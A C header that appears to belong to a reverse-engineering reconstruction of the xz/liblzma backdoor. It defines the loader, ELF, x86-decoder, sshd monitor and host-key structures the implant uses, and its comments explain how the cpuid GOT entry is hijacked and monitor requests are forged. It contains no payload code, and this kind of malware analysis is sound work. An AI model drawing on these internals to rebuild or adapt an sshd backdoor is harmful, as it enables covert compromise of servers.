#pragma once

typedef long ptrdiff_t;

typedef unsigned long size_t;

typedef long ssize_t;

typedef unsigned long uintptr_t;

typedef long intptr_t;

typedef void *va_list;

typedef signed char int8_t;

typedef unsigned char uint8_t;

typedef short int16_t;

typedef unsigned short uint16_t;

typedef int int32_t;

typedef unsigned int uint32_t;

typedef unsigned char uchar;

typedef void code(void);

typedef unsigned short ushort;

typedef unsigned int uint;

typedef long long int64_t;

typedef unsigned long long uint64_t;

typedef unsigned long ulong;

void hexdump(void *pAddressIn, long lSize);

typedef uint8_t u8;

typedef unsigned char byte;

typedef signed char sbyte;

typedef unsigned char undefined;

typedef unsigned char undefined1;

typedef unsigned short undefined2;

typedef uint32_t undefined3;

typedef uint32_t undefined4;

typedef uint64_t undefined7;

typedef uint64_t undefined8;

typedef uint16_t u16;

typedef uint32_t u32;

typedef uint64_t u64;

typedef uintptr_t uptr;

typedef unsigned int pid_t;

typedef unsigned int uid_t;

typedef unsigned int gid_t;

typedef unsigned int mode_t;

typedef uint16_t Elf64_Half;

typedef uint32_t Elf64_Word;

typedef int32_t Elf64_Sword;

typedef uint64_t Elf64_Xword;

typedef int64_t Elf64_Sxword;

typedef uint32_t Elf32_Addr;

typedef uint64_t Elf64_Addr;

typedef uint64_t Elf64_Off;

typedef uint16_t Elf64_Section;

typedef Elf64_Xword Elf64_Relr;

typedef struct
{
  unsigned char e_ident[(16)];
  Elf64_Half e_type;
  Elf64_Half e_machine;
  Elf64_Word e_version;
  Elf64_Addr e_entry;
  Elf64_Off e_phoff;
  Elf64_Off e_shoff;
  Elf64_Word e_flags;
  Elf64_Half e_ehsize;
  Elf64_Half e_phentsize;
  Elf64_Half e_phnum;
  Elf64_Half e_shentsize;
  Elf64_Half e_shnum;
  Elf64_Half e_shstrndx;
} Elf64_Ehdr;

typedef struct
{
  Elf64_Word p_type;
  Elf64_Word p_flags;
  Elf64_Off p_offset;
  Elf64_Addr p_vaddr;
  Elf64_Addr p_paddr;
  Elf64_Xword p_filesz;
  Elf64_Xword p_memsz;
  Elf64_Xword p_align;
} Elf64_Phdr;

typedef union
{
  Elf64_Xword d_val;
  Elf64_Addr d_ptr;
} Elf64_DynValue;

typedef struct
{
  Elf64_Sxword d_tag;
  Elf64_DynValue d_un;
} Elf64_Dyn;

typedef struct
{
  Elf64_Word st_name;
  unsigned char st_info;
  unsigned char st_other;
  Elf64_Section st_shndx;
  Elf64_Addr st_value;
  Elf64_Xword st_size;
} Elf64_Sym;

typedef struct
{
  Elf64_Addr r_offset;
  Elf64_Xword r_info;
  Elf64_Sxword r_addend;
} Elf64_Rela;

typedef uptr
 Elf32_Sym, Elf64_Relr,
 Elf64_Verdef, Elf64_Versym, sigset_t, fd_set;

typedef struct evp_pkey_st EVP_PKEY;

typedef struct rsa_st RSA;

typedef struct dsa_st DSA;

typedef struct bignum_st BIGNUM;

typedef struct ec_point_st EC_POINT;

typedef struct ec_key_st EC_KEY;

typedef struct ec_group_st EC_GROUP;

typedef struct evp_md_st EVP_MD;

typedef struct evp_cipher_st EVP_CIPHER;

typedef struct evp_cipher_ctx_st EVP_CIPHER_CTX;

typedef struct engine_st ENGINE;

typedef struct evp_md_ctx_st EVP_MD_CTX;

typedef struct evp_pkey_ctx_st EVP_PKEY_CTX;

typedef struct bignum_ctx BN_CTX;

typedef unsigned int point_conversion_form_t;

typedef void *(*lzma_alloc_fn)(void *opaque, size_t nmemb, size_t size);

typedef void (*lzma_free_fn)(void *opaque, void *ptr);

typedef struct {
 lzma_alloc_fn alloc;
 lzma_free_fn free;
 void *opaque;
} lzma_allocator;

typedef long int Lmid_t;

/*
 * Subset of liblzma integrity-check identifiers the implant cares about when faking encoder state so we only accept payloads signed with CRC32/CRC64/SHA256.
 */
typedef enum {
 LZMA_CHECK_NONE = 0,
 LZMA_CHECK_CRC32 = 1,
 LZMA_CHECK_CRC64 = 4,
 LZMA_CHECK_SHA256 = 10
} lzma_check;

struct auditstate
{
   uintptr_t cookie;
   unsigned int bindflags;
};

/*
 * Alias for `struct link_map *` used by ld.so audit hooks (e.g., `_dl_audit_symbind_alt`).
 */
typedef struct link_map *lookup_t;

/*
 * Prefix of glibc's link_map used by loader helpers; only l_addr/l_name/l_ld/l_next/l_prev are modeled here.
 */
typedef struct link_map {
 Elf64_Addr l_addr; /* Base load address; treated as the ELF header pointer in helpers. */
 char *l_name; /* NUL-terminated path/SONAME (empty for the main binary). */
 Elf64_Dyn *l_ld; /* Dynamic section pointer. */
 struct link_map *l_next; /* Next entry in r_debug->r_map. */
 struct link_map *l_prev; /* Previous entry in r_debug->r_map. */
} link_map;

typedef struct gnu_hash_table {
 uint32_t nbuckets; /* Bucket count in the GNU hash table. */
 uint32_t symoffset; /* Index of the first symbol in the chain table (symbias). */
 uint32_t bloom_size; /* Number of 64-bit words in the bloom filter. */
 uint32_t bloom_shift; /* Bloom filter right-shift used during lookup. */
 uint64_t bloom[]; /* Bloom filter words, followed by buckets[nbuckets] and chain[] entries. */
} gnu_hash_table_t;

struct La_i86_regs;

struct La_i86_retval;

struct La_x86_64_regs;

struct La_x86_64_retval;

struct La_x32_regs;

struct La_x32_retval;

typedef void (*audit_activity_fn)(uintptr_t *, unsigned int);

typedef char *(*audit_objsearch_fn)(const char *, uintptr_t *, unsigned int);

typedef unsigned int (*audit_objopen_fn)(struct link_map *, Lmid_t, uintptr_t *);

typedef void (*audit_preinit_fn)(uintptr_t *);

typedef unsigned int (*audit_objclose_fn)(uintptr_t *);

typedef void (*dl_audit_symbind_alt_fn)(struct link_map *l, const Elf64_Sym *ref, void **value, lookup_t result);

typedef uintptr_t (*audit_symbind64_fn)(
  Elf64_Sym *sym, unsigned int ndx,
  uptr *refcook, uptr *defcook,
  unsigned int flags, const char *symname);

typedef union {
  uintptr_t (*symbind32) (Elf32_Sym *, unsigned int, uintptr_t *,
   uintptr_t *, unsigned int *, const char *);
  uintptr_t (*symbind64) (Elf64_Sym *, unsigned int, uintptr_t *,
   uintptr_t *, unsigned int *, const char *);
 } audit_symbind_fn_t;

typedef union {
  Elf32_Addr (*i86_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,
   uintptr_t *, struct La_i86_regs *,
   unsigned int *, const char *name,
   long int *framesizep);
  Elf64_Addr (*x86_64_gnu_pltenter) (Elf64_Sym *, unsigned int,
   uintptr_t *,
   uintptr_t *, struct La_x86_64_regs *,
   unsigned int *, const char *name,
   long int *framesizep);
  Elf32_Addr (*x32_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,
   uintptr_t *, struct La_x32_regs *,
   unsigned int *, const char *name,
   long int *framesizep);
 } audit_pltenter_fn_t;

typedef union {
   unsigned int (*i86_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,
   uintptr_t *, const struct La_i86_regs *,
   struct La_i86_retval *, const char *);
  unsigned int (*x86_64_gnu_pltexit) (Elf64_Sym *, unsigned int,
   uintptr_t *,
   uintptr_t *,
   const struct La_x86_64_regs *,
   struct La_x86_64_retval *,
   const char *);
  unsigned int (*x32_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,
   uintptr_t *,
   const struct La_x32_regs *,
   struct La_x86_64_retval *,
   const char *);
 } audit_pltexit_fn_t;

struct audit_ifaces
{
 audit_activity_fn activity;
 audit_objsearch_fn objsearch;
 audit_objopen_fn objopen;
 audit_preinit_fn preinit;
 audit_symbind_fn_t symbind;
 audit_pltenter_fn_t pltenter;
 audit_pltexit_fn_t pltexit;
 audit_objclose_fn objclose;
 struct audit_ifaces *next;
};

typedef struct audit_ifaces audit_ifaces;

typedef struct {
 uint32_t state[8];
 uint64_t size;
} lzma_sha256_state;

typedef struct {
 uint8_t buffer[64];
 union {
  uint32_t crc32;
  uint64_t crc64;
  lzma_sha256_state sha256_digest;
 } state;
} lzma_check_state;

/*
 * Normalized opcode tags stored in `dasm_ctx_t::opcode_window` so pattern-matching routines can compare opcodes without re-running the decoder. One-byte opcodes are stored as `raw_opcode + 0x80`. Two- and three-byte opcodes keep their 0x0F/0x0F38/0x0F3A prefix bytes and still add 0x80 to the low opcode byte. ENDBR32/64 use the decoder's special tags (0xA5FC/0xA5FE).
 */
typedef enum X86_OPCODE {
 X86_OPCODE_1B_ADD_RM_R = 0x81,
 X86_OPCODE_1B_ADD_R_RM = 0x83,
 X86_OPCODE_1B_OR_RM_R = 0x89,
 X86_OPCODE_1B_XOR_RM_R = 0xB1,
 X86_OPCODE_1B_CMP_R_RM = 0xBB,
 X86_OPCODE_1B_GRP1_IMM8 = 0x103,
 X86_OPCODE_1B_MOV_STORE = 0x109,
 X86_OPCODE_1B_MOV_LOAD = 0x10B,
 X86_OPCODE_1B_LEA = 0x10D,
 X86_OPCODE_1B_TEST_AL_IMM8 = 0x128,
 X86_OPCODE_1B_MOV_RM_IMM32 = 0x147,
 X86_OPCODE_1B_CALL_REL32 = 0x168,
 X86_OPCODE_1B_GRP3_IMM8 = 0x176,
 X86_OPCODE_1B_GRP5 = 0x17F,
 X86_OPCODE_2B_NOP = 0x0F9F,
 X86_OPCODE_2B_MOVZX_RM8 = 0x1036,
 X86_OPCODE_CET_ENDBR32 = 0xA5FC,
 X86_OPCODE_CET_ENDBR64 = 0xA5FE,
 X86_OPCODE_LEA = 0x10D,
 X86_OPCODE_CALL = 0x168,
 X86_OPCODE_CMP = 0xBB,
 X86_OPCODE_MOV = 0x109,
 X86_OPCODE_MOV_LOAD = 0x10B,
 X86_OPCODE_MOV_STORE = 0x109
} X86_OPCODE;

/*
 * Normalized register identifiers that the decoder uses when it needs to refer to architectural registers (only RBP is currently required).
 */
enum X86_REG {
 X86_REG_RBP = 5
};

typedef enum {
 FALSE = 0,
 TRUE = 1
} BOOL;

/*
 * Bitmask describing which optional instruction prefixes (LOCK/REP, segment overrides, operand/address-size hints, VEX, REX and ModRM) were observed while decoding an x86 instruction.
 */
typedef enum {
 DF1_LOCK_REP = 1,
 DF1_SEG = 2,
 DF1_OSIZE = 4,
 DF1_ASIZE = 8,
 DF1_VEX = 0x10,
 DF1_REX = 0x20,
 DF1_MODRM = 0x40,
 DF1_SIB = 0x80
} InstructionFlags;

/*
 * Secondary flag set emitted by the decoder that captures which addressing features (displacement, immediates, 64-bit immediates) are present for the current instruction.
 */
typedef enum {
 DF2_MEM_DISP = 0x1,
 DF2_MEM_DISP8 = 0x2,
 DF2_MEM_SEG_OFFS = 0x4,
 DF2_FLAGS_MEM = DF2_MEM_DISP | DF2_MEM_DISP8 | DF2_MEM_SEG_OFFS,
 DF2_IMM = 0x8,
 DF2_IMM64 = 0x10
} InstructionFlags2;

/*
 * Bitmask describing which relocation tables, version records, and hardening features were discovered while parsing an ELF image.
 */
typedef enum {
 X_ELF_PLTREL = 0x1,
 X_ELF_RELA = 0x2,
 X_ELF_RELR = 0x4,
 X_ELF_VERDEF = 0x8,
 X_ELF_VERSYM = 0x10,
 X_ELF_NOW = 0x20
} ElfFlags;

/*
 * Categorization of the ModRM byte modes that the instruction search helpers check when scanning for register or displacement based operands.
 */
typedef enum {
 MRM_I_REG,
 MRM_I_DISP1,
 MRM_I_DISP4,
 MRM_D_REG
} ModRm_Mod;

/*
 * High-level opcode families the scanner can search for; currently only used to distinguish ENDBR64 sequences from padding NOPs.
 */
typedef enum {
 FIND_ENDBR64,
 FIND_NOP
} FuncFindType;

/*
 * Stable identifiers for each ELF image we track (main executable, ld.so, libc, liblzma, libcrypto) so helpers can index into shared arrays without raw pointers.
 */
typedef enum {
 X_ELF_MAIN = 0,
 X_ELF_DYNAMIC_LINKER = 1,
 X_ELF_LIBC = 2,
 X_ELF_LIBCRYPTO = 3
} ElfId;

/*
 * Enumerated handles for the small set of sshd status strings we care about when locating code and data references inside the binary.
 */
typedef enum {
 XREF_xcalloc_zero_size = 0,
 XREF_Could_not_chdir_to_home_directory_s_s = 1,
 XREF_list_hostkey_types = 2,
 XREF_demote_sensitive_data = 3,
 XREF_mm_terminate = 4,
 XREF_mm_pty_allocate = 5,
 XREF_mm_do_pam_account = 6,
 XREF_mm_session_pty_cleanup2 = 7,
 XREF_mm_getpwnamallow = 8,
 XREF_mm_sshpam_init_ctx = 9,
 XREF_mm_sshpam_query = 10,
 XREF_mm_sshpam_respond = 11,
 XREF_mm_sshpam_free_ctx = 12,
 XREF_mm_choose_dh = 13,
 XREF_sshpam_respond = 14,
 XREF_sshpam_auth_passwd = 15,
 XREF_sshpam_query = 16,
 XREF_start_pam = 17,
 XREF_mm_request_send = 18,
 XREF_mm_log_handler = 19,
 XREF_Could_not_get_agent_socket = 20,
 XREF_auth_root_allowed = 21,
 XREF_mm_answer_authpassword = 22,
 XREF_mm_answer_keyallowed = 23,
 XREF_mm_answer_keyverify = 24,
 XREF_48s_48s_d_pid_ld_ = 25,
 XREF_Unrecognized_internal_syslog_level_code_d = 26
} StringXrefId;

/*
 * Indexes into the deduplicated string table embedded in xzre’s rodata dump; the values double as offsets into the `string_mask_data` array.
 */
typedef enum {
 STR_from = 0x810,
 STR_ssh2 = 0x678,
 STR_48s_48s_d_pid_ld_ = 0xd8,
 STR_s = 0x708,
 STR_usr_sbin_sshd = 0x108,
 STR_Accepted_password_for = 0x870,
 STR_Accepted_publickey_for = 0x1a0,
 STR_BN_bin2bn = 0xc40,
 STR_BN_bn2bin = 0x6d0,
 STR_BN_dup = 0x958,
 STR_BN_free = 0x418,
 STR_BN_num_bits = 0x4e0,
 STR_Connection_closed_by = 0x790,
 STR_Could_not_chdir_to_home_directory_s_s = 0x18,
 STR_Could_not_get_agent_socket = 0xb0,
 STR_DISPLAY = 0x960,
 STR_DSA_get0_pqg = 0x9d0,
 STR_DSA_get0_pub_key = 0x468,
 STR_EC_KEY_get0_group = 0x7e8,
 STR_EC_KEY_get0_public_key = 0x268,
 STR_EC_POINT_point2oct = 0x6e0,
 STR_EVP_CIPHER_CTX_free = 0xb28,
 STR_EVP_CIPHER_CTX_new = 0x838,
 STR_EVP_DecryptFinal_ex = 0x2a8,
 STR_EVP_DecryptInit_ex = 0xc08,
 STR_EVP_DecryptUpdate = 0x3f0,
 STR_EVP_Digest = 0xf8,
 STR_EVP_DigestVerify = 0x408,
 STR_EVP_DigestVerifyInit = 0x118,
 STR_EVP_MD_CTX_free = 0xd10,
 STR_EVP_MD_CTX_new = 0xaf8,
 STR_EVP_PKEY_free = 0x6f8,
 STR_EVP_PKEY_new_raw_public_key = 0x758,
 STR_EVP_PKEY_set1_RSA = 0x510,
 STR_EVP_chacha20 = 0xc28,
 STR_EVP_sha256 = 0xc60,
 STR_EVP_sm = 0x188,
 STR_GLIBC_2_2_5 = 0x8c0,
 STR_GLRO_dl_naudit_naudit = 0x6a8,
 STR_KRB5CCNAME = 0x1e0,
 STR_LD_AUDIT = 0xcf0,
 STR_LD_BIND_NOT = 0xbc0,
 STR_LD_DEBUG = 0xa90,
 STR_LD_PROFILE = 0xb98,
 STR_LD_USE_LOAD_BIAS = 0x3e0,
 STR_LINES = 0xa88,
 STR_RSA_free = 0xac0,
 STR_RSA_get0_key = 0x798,
 STR_RSA_new = 0x918,
 STR_RSA_public_decrypt = 0x1d0,
 STR_RSA_set0_key = 0x540,
 STR_RSA_sign = 0x8f8,
 STR_SSH_2_0 = 0x990,
 STR_TERM = 0x4a8,
 STR_Unrecognized_internal_syslog_level_code_d = 0xe0,
 STR_WAYLAND_DISPLAY = 0x158,
 STR_errno_location = 0x878,
 STR_libc_stack_end = 0x2b0,
 STR_libc_start_main = 0x228,
 STR_dl_audit_preinit = 0xa60,
 STR_dl_audit_symbind_alt = 0x9c8,
 STR_exit = 0x8a8,
 STR_r_debug = 0x5b0,
 STR_rtld_global = 0x5b8,
 STR_rtld_global_ro = 0xa98,
 STR_auth_root_allowed = 0xb8,
 STR_authenticating = 0x1d8,
 STR_demote_sensitive_data = 0x28,
 STR_getuid = 0x348,
 STR_ld_linux_x86_64_so = 0xa48,
 STR_libc_so = 0x7d0,
 STR_libcrypto_so = 0x7c0,
 STR_liblzma_so = 0x590,
 STR_libsystemd_so = 0x938,
 STR_list_hostkey_types = 0x20,
 STR_malloc_usable_size = 0x440,
 STR_mm_answer_authpassword = 0xc0,
 STR_mm_answer_keyallowed = 0xc8,
 STR_mm_answer_keyverify = 0xd0,
 STR_mm_answer_pam_start = 0x948,
 STR_mm_choose_dh = 0x78,
 STR_mm_do_pam_account = 0x40,
 STR_mm_getpwnamallow = 0x50,
 STR_mm_log_handler = 0xa8,
 STR_mm_pty_allocate = 0x38,
 STR_mm_request_send = 0xa0,
 STR_mm_session_pty_cleanup2 = 0x48,
 STR_mm_sshpam_free_ctx = 0x70,
 STR_mm_sshpam_init_ctx = 0x58,
 STR_mm_sshpam_query = 0x60,
 STR_mm_sshpam_respond = 0x68,
 STR_mm_terminate = 0x30,
 STR_parse_PAM = 0xc58,
 STR_password = 0x400,
 STR_preauth = 0x4f0,
 STR_pselect = 0x690,
 STR_publickey = 0x7b8,
 STR_read = 0x308,
 STR_rsa_sha2_256 = 0x710,
 STR_setlogmask = 0x428,
 STR_setresgid = 0x5f0,
 STR_setresuid = 0xab8,
 STR_shutdown = 0x760,
 STR_ssh_2_0 = 0xd08,
 STR_ssh_rsa_cert_v01_openssh_com = 0x2c8,
 STR_sshpam_auth_passwd = 0x88,
 STR_sshpam_query = 0x90,
 STR_sshpam_respond = 0x80,
 STR_start_pam = 0x98,
 STR_system = 0x9f8,
 STR_unknown = 0x198,
 STR_user = 0xb10,
 STR_write = 0x380,
 STR_xcalloc_zero_size = 0x10,
 STR_yolAbejyiejuvnupEvjtgvsh5okmkAvj = 0xb00,
 STR_ELF = 0x300,
} EncodedStringId;

/*
 * State machine for the payload download/decrypt workflow (only INITIAL is defined so far while the rest of the states are discovered dynamically).
 */
typedef enum {
 PAYLOAD_STATE_INITIAL = -1
} PayloadState;

struct sshbuf {
 u8 *d; /* Data. */
 const u8 *cd; /* Const data. */
 size_t off; /* First available byte is d + off. */
 size_t size; /* Last byte is d + size - 1. */
 size_t max_size; /* Maximum size of buffer. */
 size_t alloc; /* Total bytes allocated to d. */
 int readonly; /* Refers to external, const data. */
 u32 refcount; /* Tracks self and number of child buffers. */
 struct sshbuf *parent; /* If child, pointer to parent. */
};

struct kex {
 u8 opaque;
};

typedef struct kex kex;

/*
 * Privsep-side state that exposes the RPC pipes (auth + logging), the pkex table pointer, and the monitor PID so helpers such as sshd_get_monitor_comm_fd/sshd_find_forged_modulus_sshbuf can operate on the live monitor struct.
 */
struct monitor {
 int child_to_monitor_fd; /* sshd child writes monitor RPCs to this pipe; monitor reads replies back when forging requests (DIR_WRITE). */
 int monitor_to_child_fd; /* Monitor thread writes responses here; child reads them when draining forged packets (DIR_READ). */
 int log_child_to_monitor_fd; /* Logging channel equivalent of child_to_monitor_fd (used by sshd_log_via_sshlogv/mm_log_handler). */
 int log_monitor_to_child_fd; /* Logging channel equivalent of monitor_to_child_fd so mm_log_handler can read monitor output. */
 struct kex **pkex_table; /* Pointer to the monitor's pkex table (array of sshbuf-backed kex records discovered via sshd_offsets). */
 pid_t monitor_pid; /* Process ID of the active monitor helper once privsep spins up. */
};

/*
 * Privsep-side state that exposes the RPC pipes (auth + logging), the pkex table pointer, and the monitor PID so helpers such as sshd_get_monitor_comm_fd/sshd_find_forged_modulus_sshbuf can operate on the live monitor struct.
 */
typedef struct monitor monitor;

/*
 * sshd's sensitive key table: arrays of private host keys, public host keys, and host certificates plus the `have_ssh2_key` flag.
 */
struct sensitive_data {
 struct sshkey **host_keys; /* All private host keys (NULL-terminated array). */
 struct sshkey **host_pubkeys; /* All public host keys (NULL-terminated array). */
 struct sshkey **host_certificates; /* All public host certificates (NULL-terminated array). */
 int have_ssh2_key; /* Non-zero once an SSH2 host key is loaded. */
};

/*
 * sshd's sensitive key table: arrays of private host keys, public host keys, and host certificates plus the `have_ssh2_key` flag.
 */
typedef struct sensitive_data sensitive_data;

struct sshkey {
 int type; /* OpenSSH key type enum (KEY_*). */
 int flags;
 RSA *rsa;
 DSA *dsa;
 int ecdsa_nid;
 EC_KEY *ecdsa;
 u8 *ed25519_sk;
 u8 *ed25519_pk;
 /* Tail fields omitted; minimal view for xzre. */
};

typedef struct sshkey sshkey;

/*
 * Bookkeeping for the cpuid/TLS GOT patch: seeds the expected __tls_get_addr displacement, caches the resolved GOT anchor, the cpuid slot pointer/index, and the offset back to the randomized GOT base so stage one can rewrite and later restore the cpuid entry.
 */
typedef struct __attribute__((packed)) got_ctx {
 void *tls_got_entry; /* Seeded with the expected __tls_get_addr PLT displacement (0x2600) and overwritten with the resolved GOT slot pointer once the stub is parsed. */
 void *cpuid_got_slot; /* Captures the resolver’s saved return-address slot until it is repointed at the cpuid GOT entry being hijacked. */
 u64 cpuid_slot_index; /* GOT index for liblzma’s cpuid resolver; used to stride from the __tls_get_addr anchor to the cpuid slot when patching. */
 ptrdiff_t got_base_offset; /* Offset from the randomized GOT base to the cpuid relocation anchor; subtracting it from `cpuid_random_symbol_addr` recreates the GOT base (also reused as the TLS anchor while locating the PLT stub). */
} got_ctx_t;

/*
 * Lightweight record describing the hijacked cpuid import: the runtime address of `cpuid_random_symbol`, the GOT patch context (tls anchor + cpuid slot pointer/index + GOT offset), and the resolver frame pointer reused to stash the cpuid GOT slot.
 */
typedef struct __attribute__((packed)) elf_entry_ctx {
 void *cpuid_random_symbol_addr; /* Runtime VA of the `cpuid_random_symbol` relocation; subtracting `got_ctx.got_base_offset` recreates the GOT base for the cpuid trampolines. */
 got_ctx_t got_ctx; /* Tracks the __tls_get_addr GOT anchor, the cpuid slot pointer/index, and the relocation offset while stage one rewrites the resolver. */
 u64 *resolver_frame; /* Points to the resolver’s saved frame slots on entry; after init this field is repurposed to stash the cpuid GOT slot pointer that stage two patches. */
} elf_entry_ctx_t;

/*
 * Convenience masks for projecting a decoded ModRM byte into its RM/REG/MOD fields or for retrieving the raw byte from the bit-packed representation.
 */
enum dasm_modrm_mask {
 XZ_MODRM_RM = 0xFF000000,
 XZ_MODRM_REG = 0x00FF0000,
 XZ_MODRM_MOD = 0x0000FF00,
 XZ_MODRM_RAW = 0x000000FF
};

/*
 * Opcode-map prefixes stored in `dasm_ctx_t::opcode_window_dword` before the +0x80 normalization (mask off the low opcode byte): no prefix for one-byte opcodes, 0x0F00 for two-byte opcodes, and 0x0F38/0x0F3A for the three-byte maps.
 */
enum dasm_opcode_window_map {
 XZ_OPCODE_WINDOW_ONE_BYTE = 0x00000000,
 XZ_OPCODE_WINDOW_TWO_BYTE = 0x00000F00,
 XZ_OPCODE_WINDOW_THREE_BYTE_0F38 = 0x000F3800,
 XZ_OPCODE_WINDOW_THREE_BYTE_0F3A = 0x000F3A00
};

typedef union __attribute__((packed)) {
 struct __attribute__((packed)) {
  u8 B : 1;
  u8 X : 1;
  u8 R : 1;
  u8 W : 1;
  u8 BitPattern : 4;
 } bits;
 u8 rex_byte;
} x86_rex_prefix_t;

typedef union __attribute__((packed)) {
 struct __attribute__((packed)) {
  u8 modrm;
  u8 modrm_mod;
  u8 modrm_reg;
  u8 modrm_rm;
 } breakdown;
 u32 modrm_word;
} x86_modrm_info_t;

typedef struct __attribute__((packed)) {
 u8 flags;
 u8 flags2;
 u8 prefix_padding[2];
 u8 lock_rep_byte;
 u8 seg_byte;
 u8 osize_byte;
 u8 asize_byte;
 u8 vex_byte;
 u8 vex_byte2;
 u8 vex_byte3;
 x86_rex_prefix_t rex;
 x86_modrm_info_t modrm;
} x86_prefix_fields_t;

typedef union __attribute__((packed)) {
 x86_prefix_fields_t decoded;
 u16 flags_u16;
 u32 flags_u32; /* Packed view of {decoded.flags, decoded.flags2, decoded.prefix_padding[2]} used by scanners for combined mask tests. */
 struct __attribute__((packed)) {
  u8 flags;
  u8 flags2;
  u8 prefix_padding[2];
  u8 lock_rep_byte;
  u8 seg_byte;
  u8 osize_byte;
  u8 asize_byte;
  u8 vex_byte;
  u8 vex_byte2;
  u8 vex_byte3;
  u8 rex_byte; /* Raw REX prefix byte when present. */
  u8 modrm_byte; /* Raw ModRM byte. */
  u8 modrm_mod; /* ModRM[7:6] (addressing mode). */
  u8 modrm_reg; /* ModRM[5:3] (register/opcode extension). */
  u8 modrm_rm; /* ModRM[2:0] (register/memory operand selector). */
 } modrm_bytes;
} x86_prefix_state_t;

typedef union __attribute__((packed)) {
 u8 opcode_window[4]; /* Rolling opcode window that normalises one-, two-, and three-byte opcodes. */
 X86_OPCODE opcode_window_dword; /* 32-bit view of the opcode window starting at opcode_window[0]. */
} dasm_opcode_window_t;

/*
 * Hand-written x86 decoder used throughout the project to find instructions without shipping a full disassembler.
 * It records prefix bits, VEX/REX state, ModRM/SIB breakdowns, computed operands, and scratch fields so pattern searchers can share one structure.
 */
typedef struct __attribute__((packed)) dasm_ctx {
 u8* instruction; /* Base pointer to the decoded instruction so scanners can rescan or compute RIP-relative targets. */
 u64 instruction_size; /* Number of bytes consumed while decoding `instruction`. */
 x86_prefix_state_t prefix; /* Cached legacy-prefix/VEX/REX breakdown for this decode. */
 u8 mov_imm_reg_index; /* Lower 3 bits of the MOV r64, imm64 destination register (combine with REX.B when present). */
 u8 sib_byte; /* Raw SIB byte when the addressing mode uses one. */
 u8 sib_scale_bits; /* SIB scale component extracted from `sib_byte`. */
 u8 sib_index_bits; /* SIB index register (prior to applying REX.X). */
 u8 sib_base_bits; /* SIB base register (prior to applying REX.B). */
 u8 opcode_window_prefix[3]; /* Leading bytes before the 32-bit opcode window. */
 dasm_opcode_window_t opcode_window; /* Rolling opcode window that normalises one-, two-, and three-byte opcodes. */
 u8 rel32_bytes[4]; /* Scratch copy of the rel32 displacement bytes for branch/LEA scanners. */
 u64 mem_disp; /* Displacement immediate; when DF1 is set add `instruction + instruction_size` for RIP-relative targets. */
 u64 imm_signed; /* Immediate value sign-extended to 64 bits. */
 u64 imm_zeroextended; /* Immediate value zero-extended to 64 bits. */
 u64 imm_size; /* Size in bytes of the decoded immediate (0 when the opcode lacks one). */
 u8 opcode_offset; /* Offset from `instruction` to the current opcode byte used during decoding. */
 u8 decoder_scratch[7]; /* Zeroed padding the decoder reuses as scratch state. */
} dasm_ctx_t;

/*
 * Parsed view of an ELF image that exposes the headers, relocation tables, version info, code/data segments, and GNU hash metadata needed by the import fix-ups.
 */
typedef struct __attribute__((packed)) elf_info {
 Elf64_Ehdr *elfbase; /* Base pointer to the mapped ELF header used for pointer arithmetic. */
 u64 load_base_vaddr; /* Lowest PT_LOAD virtual address so runtime addrs can be rebased into the file image. */
 Elf64_Phdr *phdrs; /* Program header table inside the mapped object. */
 u64 phdr_count; /* Number of program headers validated by elf_info_parse. */
 Elf64_Dyn *dynamic_segment; /* PT_DYNAMIC table extracted from the load. */
 u64 dyn_entry_count; /* Number of meaningful dynamic entries discovered before DT_NULL. */
 char *dynstr; /* .dynstr (string table for dynamic symbols). */
 Elf64_Sym *dynsym; /* .dynsym pointer used by the GNU hash walker. */
 Elf64_Rela *plt_relocs; /* DT_JMPREL relocations (PLT/GOT). */
 u32 plt_reloc_count; /* Number of PLT reloc entries. */
 BOOL gnurelro_present; /* TRUE if a PT_GNU_RELRO segment was found. */
 u64 gnurelro_vaddr; /* Virtual address of the GNU_RELRO segment. */
 u64 gnurelro_memsize; /* Length of the GNU_RELRO mapping. */
 Elf64_Verdef *verdef; /* Pointer to version definition records (.gnu.version_d). */
 u64 verdef_count; /* Number of version definitions copied from DT_VERDEFNUM. */
 Elf64_Versym *versym; /* Pointer to .gnu.version for per-symbol version tags. */
 Elf64_Rela *rela_relocs; /* DT_RELA relocation table (non-PLT). */
 u32 rela_reloc_count; /* Number of DT_RELA entries. */
 u32 relr_reserved0; /* Padding/alignment so the RELR pair stays 16-byte aligned. */
 Elf64_Relr *relr_relocs; /* DT_RELR table when the binary uses compact RELR relocations. */
 u32 relr_reloc_count; /* Number of DT_RELR entries. */
 u32 relr_reserved1; /* Additional padding for RELR metadata. */
 u64 text_segment_start; /* Cached start of the executable PT_LOAD segment (page aligned). */
 u64 text_segment_size; /* Size of the cached executable segment. */
 u64 rodata_segment_start; /* Cached start of the read-only data segment. */
 u64 rodata_segment_size; /* Size of the cached rodata segment. */
 u64 data_segment_start; /* Start of the writable PT_LOAD segment (file-backed bytes). */
 u64 data_segment_size; /* Size of writable segment excluding alignment padding. */
 u64 data_segment_padding; /* Extra bytes between the file-backed end and the page boundary. */
 u64 feature_flags; /* Bitmask tracking optional tables (1=PLT,2=RELA,4=RELR,8=VERDEF,0x10=VERSYM,0x20=BIND_NOW). */
 u32 gnu_hash_nbuckets; /* GNU hash header: bucket count. */
 u32 gnu_hash_last_bloom; /* GNU hash header: bloom filter size minus one. */
 u32 gnu_hash_bloom_shift; /* GNU hash header: shift count used by the bloom filter. */
 u32 gnu_hash_reserved; /* Alignment padding before the bloom/bucket/chain pointers. */
 u64 *gnu_hash_bloom; /* Pointer to the bloom filter words. */
 u32 *gnu_hash_buckets; /* Pointer to the GNU hash buckets array. */
 u32 *gnu_hash_chain; /* Pointer to the GNU hash chain table (starting at symbias). */
} elf_info_t;

typedef size_t (*pfn_malloc_usable_size_t)(void *ptr);

typedef uid_t (*pfn_getuid_t)(void);

typedef void (*pfn_exit_t)(int status);

typedef int (*pfn_setresgid_t)(gid_t rgid, gid_t egid, gid_t sgid);

typedef int (*pfn_setresuid_t)(uid_t ruid, uid_t euid, uid_t suid);

typedef int (*pfn_system_t)(const char *command);

typedef ssize_t (*pfn_write_t)(int fd, const void *buf, size_t count);

typedef int (*pfn_pselect_t)(
  int nfds, fd_set *readfds, fd_set *writefds,
  fd_set *exceptfds, const struct timespec *timeout,
  const sigset_t *sigmask);

typedef ssize_t (*pfn_read_t)(int fd, void *buf, size_t count);

typedef int *(*pfn___errno_location_t)(void);

